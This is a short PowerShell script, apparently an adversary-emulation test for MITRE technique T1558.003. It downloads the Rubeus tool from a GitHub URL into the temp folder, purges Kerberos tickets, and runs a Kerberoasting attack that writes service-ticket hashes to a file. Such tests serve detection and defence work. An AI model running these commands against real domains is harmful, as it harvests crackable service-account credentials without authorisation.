# T1558.003 - Rubeus Kerberoasting

if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {
    
} else {
    Write-Host Joining this computer to a domain must be done manually
}

if(Test-Path -Path $Env:temp\rubeus.exe) {
    
} else {
    Invoke-Webrequest -Uri https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe -OutFile $Env:temp\rubeus.exe
}


klist purge
cmd.exe /c "$Env:temp\rubeus.exe" kerberoast "" /outfile:"$Env:temp\rubeus_output.txt"